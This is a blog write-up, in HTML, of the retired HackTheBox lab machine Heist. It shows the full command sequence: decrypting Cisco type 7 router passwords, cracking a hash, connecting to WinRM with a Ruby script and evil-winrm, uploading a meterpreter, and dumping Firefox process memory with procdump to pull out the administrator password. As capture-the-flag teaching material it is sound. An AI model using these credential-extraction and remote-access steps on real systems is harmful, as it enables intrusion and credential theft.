@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Heist | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="https://maggick.fr/theme/css/pure-min.css">
+    <link rel="stylesheet" href="https://maggick.fr/theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="https://maggick.fr/index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="https://maggick.fr/pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="https://maggick.fr/pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="https://maggick.fr/2019/01/htb-heist.html" title="Read more" class="entry-title-link">
+                HTB: Heist</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2019-01-12T17:35:00+01:00">12 Jan 2019</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="https://maggick.fr/author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="https://maggick.fr/tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="https://maggick.fr/tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="https://maggick.fr/tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="https://maggick.fr/tag/cisco.html" title="Read more with the label Cisco" class="meta-link">Cisco</a> 
+          <a href="https://maggick.fr/tag/winrm.html" title="Read more with the label winrm" class="meta-link">winrm</a> 
+          <a href="https://maggick.fr/tag/procdump.html" title="Read more with the label procdump" class="meta-link">procdump</a> 
+          <a href="https://maggick.fr/tag/meterpreter.html" title="Read more with the label meterpreter" class="meta-link">meterpreter</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 9 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2019.12/heist_card.png" alt="Heist card" width="262"></p>
+<p>This is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/201">Heist</a>
+This box is classified as an easy machine.</p>
+
+
+<div class="toc">
+<ul>
+<li><a href="#recon">Recon</a><ul>
+<li><a href="#port-80-http">port 80: HTTP</a></li>
+<li><a href="#port-135-msrpc">port 135: MSRPC</a></li>
+<li><a href="#port-445-smb">Port 445: SMB</a></li>
+<li><a href="#port-5985-winrm">Port 5985: WinRM</a></li>
+<li><a href="#port-49669-msrpc">Port 49669: MSRPC</a></li>
+</ul>
+</li>
+<li><a href="#web">Web</a><ul>
+<li><a href="#lazagne">Lazagne</a></li>
+<li><a href="#procdump">procdump</a></li>
+</ul>
+</li>
+<li><a href="#wrapping-up">Wrapping up</a></li>
+</ul>
+</div>
+<h1 id="recon">Recon</h1>
+<p>We start with an nmap scan.</p>
+<div class="highlight"><pre><span class="code-line"><span></span># Nmap 7.80 scan initiated Wed Nov  6 15:29:09 2019 as: nmap -p- -sSV -oA nmap 10.10.10.149</span>
+<span class="code-line">Nmap scan report for 10.10.10.149</span>
+<span class="code-line">Host is up (0.23s latency).</span>
+<span class="code-line">Not shown: 65530 filtered ports</span>
+<span class="code-line">PORT      STATE SERVICE       VERSION</span>
+<span class="code-line">80/tcp    open  http          Microsoft IIS httpd 10.0</span>
+<span class="code-line">135/tcp   open  msrpc         Microsoft Windows RPC</span>
+<span class="code-line">445/tcp   open  microsoft-ds?</span>
+<span class="code-line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="code-line">49669/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="code-line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+<span class="code-line"></span>
+<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="code-line"># Nmap done at Wed Nov  6 15:34:10 2019 -- 1 IP address (1 host up) scanned in 301.46 seconds</span>
+</pre></div>
+
+
+<h2 id="port-80-http">port 80: HTTP</h2>
+<p>This port is the web service.</p>
+<h2 id="port-135-msrpc">port 135: MSRPC</h2>
+<h2 id="port-445-smb">Port 445: SMB</h2>
+<p>This port is for SMB.</p>
+<h2 id="port-5985-winrm">Port 5985: WinRM</h2>
+<p>This port is used by the WinRM service</p>
+<h2 id="port-49669-msrpc">Port 49669: MSRPC</h2>
+<h1 id="web">Web</h1>
+<p>We found an authentication page with an option to login as a guest.
+Then we see a conversation between an user and the support about a CISCO router
+configuration.</p>
+<p><img alt="configuration cisco" src="/media/2019.12/heist_1.png"></p>
+<p>The router configuration is the following:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="err">version 12.2</span></span>
+<span class="code-line"><span class="err">no service pad</span></span>
+<span class="code-line"><span class="err">service password-encryption</span></span>
+<span class="code-line"><span class="err">!</span></span>
+<span class="code-line"><span class="err">isdn switch-type basic-5ess</span></span>
+<span class="code-line"><span class="err">!</span></span>
+<span class="code-line"><span class="err">hostname ios-1</span></span>
+<span class="code-line"><span class="err">!</span></span>
+<span class="code-line"><span class="err">security passwords min-length 12</span></span>
+<span class="code-line"><span class="err">enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91</span></span>
+<span class="code-line"><span class="err">!</span></span>
+<span class="code-line"><span class="err">username rout3r password 7 0242114B0E143F015F5D1E161713</span></span>
+<span class="code-line"><span class="err">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</span></span>
+<span class="code-line"><span class="err">!</span></span>
+<span class="code-line"><span class="err">!</span></span>
+<span class="code-line"><span class="err">ip ssh authentication-retries 5</span></span>
+<span class="code-line"><span class="err">ip ssh version 2</span></span>
+<span class="code-line"><span class="err">!</span></span>
+<span class="code-line"><span class="err">!</span></span>
+<span class="code-line"><span class="err">router bgp 100</span></span>
+<span class="code-line"><span class="err">synchronization</span></span>
+<span class="code-line"><span class="err">bgp log-neighbor-changes</span></span>
+<span class="code-line"><span class="err">bgp dampening</span></span>
+<span class="code-line"><span class="err">network 192.168.0.0Â mask 300.255.255.0</span></span>
+<span class="code-line"><span class="err">timers bgp 3 9</span></span>
+<span class="code-line"><span class="err">redistribute connected</span></span>
+<span class="code-line"><span class="err">!</span></span>
+<span class="code-line"><span class="err">ip classless</span></span>
+<span class="code-line"><span class="err">ip route 0.0.0.0 0.0.0.0 192.168.0.1</span></span>
+<span class="code-line"><span class="err">!</span></span>
+<span class="code-line"><span class="err">!</span></span>
+<span class="code-line"><span class="err">access-list 101 permit ip any any</span></span>
+<span class="code-line"><span class="err">dialer-list 1 protocol ip list 101</span></span>
+<span class="code-line"><span class="err">!</span></span>
+<span class="code-line"><span class="err">no ip http server</span></span>
+<span class="code-line"><span class="err">no ip http secure-server</span></span>
+<span class="code-line"><span class="err">!</span></span>
+<span class="code-line"><span class="err">line vty 0 4</span></span>
+<span class="code-line"><span class="err">session-timeout 600</span></span>
+<span class="code-line"><span class="err">authorization exec SSH</span></span>
+<span class="code-line"><span class="err">transport input ssh</span></span>
+</pre></div>
+
+
+<p>We use <a href="https://github.com/theevilbit/ciscot7">a cisco type 7 decrypter</a> to get
+the <code>rout3r</code> and <code>admin</code> passwords.</p>
+<div class="highlight"><pre><span class="code-line"><span></span>python ciscot7.py -d -p 0242114B0E143F015F5D1E161713</span>
+<span class="code-line">Decrypted password: $uperP@ssword</span>
+<span class="code-line">python ciscot7.py -d -p 02375012182C1A1D751618034F36415408</span>
+<span class="code-line">Decrypted password: Q4)sJu\Y8qz*A3?d</span>
+</pre></div>
+
+
+<p>For the hashed password we use john with rockyou:</p>
+<div class="highlight"><pre><span class="code-line"><span></span>john hash -w=~/tools/password_lists/rockyou.txt</span>
+<span class="code-line">Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])</span>
+<span class="code-line">Will run 4 OpenMP threads</span>
+<span class="code-line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span>
+<span class="code-line">stealth1agent    (?)</span>
+</pre></div>
+
+
+<p>We now have three potential users as well as three potential passwords. The
+users:
+  1. admin
+  2. rout3r
+  3. Hazard</p>
+<p>The passwords:
+  1. <code>$uperP@ssword</code>
+  2. <code>Q4)sJu\Y8qz*A3?d</code>
+  3. <code>stealth1agent</code></p>
+<p>We want to connect using the WinRM service. We can use
+<a href="https://github.com/Hackplayers/evil-winrm">evil winrm</a> as well as a simple
+ruby script:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="nb">require</span> <span class="s1">&#39;winrm&#39;</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">conn</span> <span class="o">=</span> <span class="no">WinRM</span><span class="o">::</span><span class="no">Connection</span><span class="o">.</span><span class="n">new</span><span class="p">(</span></span>
+<span class="code-line">  <span class="ss">endpoint</span><span class="p">:</span> <span class="s1">&#39;http://10.10.10.149:5985/wsman&#39;</span><span class="p">,</span></span>
+<span class="code-line">  <span class="ss">user</span><span class="p">:</span> <span class="s1">&#39;rout3r&#39;</span><span class="p">,</span></span>
+<span class="code-line">  <span class="ss">password</span><span class="p">:</span> <span class="s1">&#39;Q4)sJu\Y8qz*A3?d&#39;</span><span class="p">,</span></span>
+<span class="code-line"><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">command</span><span class="o">=</span><span class="s2">&quot;&quot;</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">conn</span><span class="o">.</span><span class="n">shell</span><span class="p">(</span><span class="ss">:powershell</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">shell</span><span class="o">|</span></span>
+<span class="code-line">    <span class="k">until</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">&quot;exit</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="k">do</span></span>
+<span class="code-line">        <span class="nb">print</span> <span class="s2">&quot;PS &gt; &quot;</span></span>
+<span class="code-line">        <span class="n">command</span> <span class="o">=</span> <span class="nb">gets</span></span>
+<span class="code-line">        <span class="n">output</span> <span class="o">=</span> <span class="n">shell</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span><span class="o">|</span></span>
+<span class="code-line">            <span class="no">STDOUT</span><span class="o">.</span><span class="n">print</span> <span class="n">stdout</span></span>
+<span class="code-line">            <span class="no">STDERR</span><span class="o">.</span><span class="n">print</span> <span class="n">stderr</span></span>
+<span class="code-line">        <span class="k">end</span></span>
+<span class="code-line">    <span class="k">end</span></span>
+<span class="code-line">    <span class="nb">puts</span> <span class="s2">&quot;Exiting with code </span><span class="si">#{</span><span class="n">output</span><span class="o">.</span><span class="n">exitcode</span><span class="si">}</span><span class="s2">&quot;</span></span>
+<span class="code-line"><span class="k">end</span></span>
+</pre></div>
+
+
+<p>Trying all the possible combination won't give up a shell. We need more
+enumeration. We launch
+<a href="https://github.com/SecureAuthCorp/impacket/">impacket's lookupsid</a> using the
+different user/password combinations. One is working with the Hazard user and
+the <code>stealth1agent</code> password:</p>
+<div class="highlight"><pre><span class="code-line"><span></span>python lookupsid.py Hazard:stealth1agent@10.10.10.149</span>
+<span class="code-line">Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation</span>
+<span class="code-line"></span>
+<span class="code-line">[*] Brute forcing SIDs at 10.10.10.149</span>
+<span class="code-line">[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]</span>
+<span class="code-line">[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112</span>
+<span class="code-line">500: SUPPORTDESK\Administrator (SidTypeUser)</span>
+<span class="code-line">501: SUPPORTDESK\Guest (SidTypeUser)</span>
+<span class="code-line">503: SUPPORTDESK\DefaultAccount (SidTypeUser)</span>
+<span class="code-line">504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)</span>
+<span class="code-line">513: SUPPORTDESK\None (SidTypeGroup)</span>
+<span class="code-line">1008: SUPPORTDESK\Hazard (SidTypeUser)</span>
+<span class="code-line">1009: SUPPORTDESK\support (SidTypeUser)</span>
+<span class="code-line">1012: SUPPORTDESK\Chase (SidTypeUser)</span>
+<span class="code-line">1013: SUPPORTDESK\Jason (SidTypeUser)</span>
+</pre></div>
+
+
+<p>We have more users now! We can eliminate the <code>stealth1agent</code> password as this is
+Hazard's password.
+A few combination later using winrm, we discover that the user Chase use the
+<code>Q4)sJu\Y8qz*A3?d</code> password. We have a shell and the user flag:</p>
+<div class="highlight"><pre><span class="code-line"><span></span>ruby winrm.rb</span>
+<span class="code-line">PS &gt; whoami</span>
+<span class="code-line">supportdesk\chase</span>
+<span class="code-line">PS &gt; dir ../Desktop</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">    Directory: C:\Users\Chase\Desktop</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">Mode                LastWriteTime         Length Name</span>
+<span class="code-line">----                -------------         ------ ----</span>
+<span class="code-line">-a----        4/22/2019   9:08 AM            121 todo.txt</span>
+<span class="code-line">-a----        4/22/2019   9:07 AM             32 user.txt</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">PS &gt; type ../Desktop/user.txt</span>
+<span class="code-line">a127d&lt;redacted&gt;</span>
+<span class="code-line">PS &gt; type ../Desktop/todo.txt</span>
+<span class="code-line">Stuff to-do:</span>
+<span class="code-line">1. Keep checking the issues list.</span>
+<span class="code-line">2. Fix the router config.</span>
+<span class="code-line"></span>
+<span class="code-line">Done:</span>
+<span class="code-line">1. Restricted access for guest user.</span>
+</pre></div>
+
+
+<p>We can upload a meterpreter (generated with msfvenom) using
+<a href="https://github.com/Hackplayers/evil-winrm">evil winrm</a></p>
+<div class="highlight"><pre><span class="code-line"><span></span>evil-winrm  -i 10.10.10.149 -u ^Case -p &#39;Q4)sJu\Y8qz*A3?d&#39;</span>
+</pre></div>
+
+
+<p>The meterpreter allow us to easy enumerate the box. Let us take a look at the
+running process:</p>
+<div class="highlight"><pre><span class="code-line"><span></span>meterpreter &gt; ps</span>
+<span class="code-line"></span>
+<span class="code-line">Process List</span>
+<span class="code-line">============</span>
+<span class="code-line"></span>
+<span class="code-line">PID   PPID  Name                     Arch  Session  User               Path</span>
+<span class="code-line">---   ----  ----                     ----  -------  ----               ----</span>
+<span class="code-line">0     0     [System Process]                                           </span>
+<span class="code-line">4     0     System                                                     </span>
+<span class="code-line">104   4     Registry                                                   </span>
+<span class="code-line">268   612   svchost.exe                                                </span>
+<span class="code-line">300   4     smss.exe                                                   </span>
+<span class="code-line">340   612   svchost.exe                                                </span>
+<span class="code-line">404   396   csrss.exe                                                  </span>
+<span class="code-line">408   612   svchost.exe                                                </span>
+<span class="code-line">480   396   wininit.exe                                                </span>
+<span class="code-line">488   472   csrss.exe                                                  </span>
+<span class="code-line">544   472   winlogon.exe                                               </span>
+<span class="code-line">612   480   services.exe                                               </span>
+<span class="code-line">632   480   lsass.exe                                                  </span>
+<span class="code-line">652   792   dllhost.exe              x64   1        SUPPORTDESK\Chase  C:\Windows\System32\dllhost.exe</span>
+<span class="code-line">684   612   svchost.exe                                                </span>
+<span class="code-line">764   612   svchost.exe                                                </span>
+<span class="code-line">784   612   svchost.exe                                                </span>
+<span class="code-line">792   612   svchost.exe                                                </span>
+<span class="code-line">812   544   fontdrvhost.exe                                            </span>
+<span class="code-line">820   480   fontdrvhost.exe                                            </span>
+<span class="code-line">904   612   svchost.exe                                                </span>
+<span class="code-line">956   612   svchost.exe                                                </span>
+<span class="code-line">984   612   svchost.exe                                                </span>
+<span class="code-line">1020  544   dwm.exe                                                    </span>
+<span class="code-line">1052  612   svchost.exe                                                </span>
+<span class="code-line">1128  612   svchost.exe                                                </span>
+<span class="code-line">1164  612   svchost.exe                                                </span>
+<span class="code-line">1184  612   svchost.exe                                                </span>
+<span class="code-line">1248  612   svchost.exe                                                </span>
+<span class="code-line">1300  612   svchost.exe                                                </span>
+<span class="code-line">1348  612   svchost.exe                                                </span>
+<span class="code-line">1356  612   svchost.exe                                                </span>
+<span class="code-line">1364  612   svchost.exe                                                </span>
+<span class="code-line">1376  612   svchost.exe                                                </span>
+<span class="code-line">1468  612   svchost.exe                                                </span>
+<span class="code-line">1512  612   svchost.exe                                                </span>
+<span class="code-line">1580  612   svchost.exe                                                </span>
+<span class="code-line">1624  612   svchost.exe                                                </span>
+<span class="code-line">1632  612   svchost.exe                                                </span>
+<span class="code-line">1720  612   svchost.exe                                                </span>
+<span class="code-line">1780  1468  taskhostw.exe                                              </span>
+<span class="code-line">1820  612   svchost.exe                                                </span>
+<span class="code-line">1896  612   svchost.exe                                                </span>
+<span class="code-line">1968  612   svchost.exe                                                </span>
+<span class="code-line">1992  612   svchost.exe                                                </span>
+<span class="code-line">2216  612   svchost.exe                                                </span>
+<span class="code-line">2564  612   spoolsv.exe                                                </span>
+<span class="code-line">2624  612   svchost.exe                                                </span>
+<span class="code-line">2632  612   svchost.exe                                                </span>
+<span class="code-line">2640  612   svchost.exe                                                </span>
+<span class="code-line">2660  612   svchost.exe                                                </span>
+<span class="code-line">2700  792   TiWorker.exe                                               </span>
+<span class="code-line">2708  612   svchost.exe                                                </span>
+<span class="code-line">2716  612   svchost.exe                                                </span>
+<span class="code-line">2740  612   svchost.exe                                                </span>
+<span class="code-line">2768  612   svchost.exe                                                </span>
+<span class="code-line">2776  612   svchost.exe                                                </span>
+<span class="code-line">2804  612   VGAuthService.exe                                          </span>
+<span class="code-line">2828  612   vmtoolsd.exe                                               </span>
+<span class="code-line">2852  612   svchost.exe                                                </span>
+<span class="code-line">2896  612   svchost.exe                                                </span>
+<span class="code-line">2920  612   svchost.exe                                                </span>
+<span class="code-line">2948  612   svchost.exe                                                </span>
+<span class="code-line">2956  612   MsMpEng.exe                                                </span>
+<span class="code-line">3024  5416  01.exe                   x64   0        SUPPORTDESK\Chase  C:\Users\Chase\Documents\01.exe</span>
+<span class="code-line">3036  612   svchost.exe                                                </span>
+<span class="code-line">3104  792   ShellExperienceHost.exe                                    </span>
+<span class="code-line">3224  612   svchost.exe                                                </span>
+<span class="code-line">3352  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe</span>
+<span class="code-line">3360  612   svchost.exe                                                </span>
+<span class="code-line">3376  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe</span>
+<span class="code-line">3720  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe</span>
+<span class="code-line">3784  612   svchost.exe                                                </span>
+<span class="code-line">3932  612   dllhost.exe                                                </span>
+<span class="code-line">3976  792   WmiPrvSE.exe                                               </span>
+<span class="code-line">4004  792   wsmprovhost.exe                                            </span>
+<span class="code-line">4040  612   svchost.exe                                                </span>
+<span class="code-line">4196  6808  conhost.exe                                                </span>
+<span class="code-line">4200  792   SearchUI.exe                                               </span>
+<span class="code-line">4216  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe</span>
+<span class="code-line">4236  612   msdtc.exe                                                  </span>
+<span class="code-line">4392  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe</span>
+<span class="code-line">4408  792   WmiPrvSE.exe                                               </span>
+<span class="code-line">4704  612   TrustedInstaller.exe                                       </span>
+<span class="code-line">4888  792   RuntimeBroker.exe                                          </span>
+<span class="code-line">5140  1184  sihost.exe                                                 </span>
+<span class="code-line">5148  612   svchost.exe                                                </span>
+<span class="code-line">5188  612   svchost.exe                                                </span>
+<span class="code-line">5260  1468  taskhostw.exe                                              </span>
+<span class="code-line">5352  612   svchost.exe                                                </span>
+<span class="code-line">5364  612   svchost.exe                                                </span>
+<span class="code-line">5416  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe</span>
+<span class="code-line">5456  612   svchost.exe                                                </span>
+<span class="code-line">5524  612   svchost.exe                                                </span>
+<span class="code-line">5572  792   RuntimeBroker.exe                                          </span>
+<span class="code-line">5584  5524  ctfmon.exe                                                 </span>
+<span class="code-line">5620  612   svchost.exe                                                </span>
+<span class="code-line">5908  5880  explorer.exe                                               </span>
+<span class="code-line">6080  3376  conhost.exe              x64   0        SUPPORTDESK\Chase  C:\Windows\System32\conhost.exe</span>
+<span class="code-line">6140  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe</span>
+<span class="code-line">6228  6852  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe</span>
+<span class="code-line">6304  792   RuntimeBroker.exe                                          </span>
+<span class="code-line">6388  6852  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe</span>
+<span class="code-line">6464  6672  php-cgi.exe                                                </span>
+<span class="code-line">6564  5908  vmtoolsd.exe                                               </span>
+<span class="code-line">6584  792   wsmprovhost.exe          x64   0        SUPPORTDESK\Chase  C:\Windows\System32\wsmprovhost.exe</span>
+<span class="code-line">6672  2896  w3wp.exe                                                   </span>
+<span class="code-line">6772  612   svchost.exe                                                </span>
+<span class="code-line">6792  6852  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe</span>
+<span class="code-line">6808  1468  MpCmdRun.exe                                               </span>
+<span class="code-line">6852  6676  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe</span>
+<span class="code-line">6940  612   svchost.exe                                                </span>
+<span class="code-line">6948  6672  php-cgi.exe                                                </span>
+<span class="code-line">6988  6852  firefox.exe              x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe</span>
+</pre></div>
+
+
+<p>Our Chase user is running a Firefox Browser. The idea is to see if there is
+credentials stored in the browser's password manager. For that we will use
+<a href="https://github.com/AlessandroZ/LaZagne/">LaZagne</a>.</p>
+<h2 id="lazagne">Lazagne</h2>
+<p>We upload the Lazagne executable using the meterpreter. Then using a shell we
+launch LaZagne with the <code>browsers</code> parameter.</p>
+<div class="highlight"><pre><span class="code-line"><span></span>meterpreter &gt; shell</span>
+<span class="code-line">Process 3468 created.</span>
+<span class="code-line">Channel 5 created.</span>
+<span class="code-line">Microsoft Windows [Version 10.0.17763.437]</span>
+<span class="code-line">(c) 2018 Microsoft Corporation. All rights reserved.</span>
+<span class="code-line"></span>
+<span class="code-line">C:\Users\Chase\Documents&gt;.\05.exe browsers</span>
+<span class="code-line">.\05.exe browsers</span>
+<span class="code-line"></span>
+<span class="code-line">|====================================================================|</span>
+<span class="code-line">|                                                                    |</span>
+<span class="code-line">|                        The LaZagne Project                         |</span>
+<span class="code-line">|                                                                    |</span>
+<span class="code-line">|                          ! BANG BANG !                             |</span>
+<span class="code-line">|                                                                    |</span>
+<span class="code-line">|====================================================================|</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">[+] 0 passwords have been found.</span>
+<span class="code-line">For more information launch it again with the -v option</span>
+<span class="code-line"></span>
+<span class="code-line">elapsed time = 0.0</span>
+</pre></div>
+
+
+<p>We did not found any password in the browser's password storage. Let us see what
+is the process memory.</p>
+<h2 id="procdump">procdump</h2>
+<p>We upload procdump.exe from
+<a href="https://docs.microsoft.com/en-us/sysinternals/">Systinternals</a> and dump the
+Firefox process memory before downloading the dump on our machine.</p>
+<div class="highlight"><pre><span class="code-line"><span></span>meterpreter &gt; upload procdump.exe 06.exe</span>
+<span class="code-line">[*] uploading  : procdump.exe -&gt; 06.exe</span>
+<span class="code-line">[*] Uploaded 467.19 KiB of 467.19 KiB (100.0%): procdump.exe -&gt; 06.exe</span>
+<span class="code-line">[*] uploaded   : procdump.exe -&gt; 06.exe</span>
+<span class="code-line"></span>
+<span class="code-line">C:\Users\Chase\Documents&gt;.\06.exe -ma 6228</span>
+<span class="code-line">.\06.exe -ma 6228</span>
+<span class="code-line"></span>
+<span class="code-line">ProcDump v6.00 - Writes process dump files</span>
+<span class="code-line">Copyright (C) 2009-2013 Mark Russinovich</span>
+<span class="code-line">Sysinternals - www.sysinternals.com</span>
+<span class="code-line">With contributions from Andrew Richards</span>
+<span class="code-line"></span>
+<span class="code-line">Writing dump file C:\Users\Chase\Documents\firefox_191106_223459.dmp ...</span>
+<span class="code-line">Writing 293MB. Estimated time (less than) 9 seconds.</span>
+<span class="code-line">Dump written.</span>
+<span class="code-line"></span>
+<span class="code-line">meterpreter &gt; download firefox_191106_223459.dmp ./</span>
+<span class="code-line">[*] Downloading: firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp</span>
+<span class="code-line">[*] Downloaded 1.00 MiB of 286.62 MiB (0.35%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp</span>
+<span class="code-line">[*] Downloaded 2.00 MiB of 286.62 MiB (0.7%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp</span>
+<span class="code-line">[*] Downloaded 3.00 MiB of 286.62 MiB (1.05%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp</span>
+<span class="code-line">[*] Downloaded 4.00 MiB of 286.62 MiB (1.4%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp</span>
+<span class="code-line">[*] Downloaded 5.00 MiB of 286.62 MiB (1.74%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp</span>
+</pre></div>
+
+
+<p>We then <code>grep</code> in the dump for some password.</p>
+<div class="highlight"><pre><span class="code-line"><span></span>strings firefox_191106_223459.dmp | grep -i password | grep admin -i</span>
+<span class="code-line">MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=</span>
+<span class="code-line">RG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=</span>
+<span class="code-line">MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=</span>
+</pre></div>
+
+
+<p>We can then use the login and password either to connect to the support website
+or to the server using the <code>administrator</code> account.</p>
+<div class="highlight"><pre><span class="code-line"><span></span>evil-winrm  -i 10.10.10.149 -u administrator -p &#39;4dD!5}x/re8]FBuZ&#39;</span>
+<span class="code-line"></span>
+<span class="code-line">Evil-WinRM shell v1.8</span>
+<span class="code-line"></span>
+<span class="code-line">Info: Establishing connection to remote endpoint</span>
+<span class="code-line"></span>
+<span class="code-line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type ../Desktop/root.txt</span>
+<span class="code-line">50dfa&lt;redacted&gt;</span>
+</pre></div>
+
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>In this machine we used evil-rm in to order to exploit the port 5985 as
+I work on this machine after the forest one this was not something new (maybe
+this article will be publish before the forest's one as I wait for the machine
+to retire). We use a simple meterpreter and proc dump to found the password
+stored in the Firefox memory.</p>
+<p>I was a bit disappointed that there was no real exploitation of the CISCO router.
+I was hoping for some pivoting from the first VM to another one use the router
+or something similar.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="https://maggick.fr/2018/10/flare-on-challenge-2018.html"> Flare-on Challenge 2018 </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="https://maggick.fr/2019/09/htb-jerry.html"> HTB: Jerry </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = "matthieukeller";
+        var disqus_identifier = "2019/01/htb-heist.html";
+
+        (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
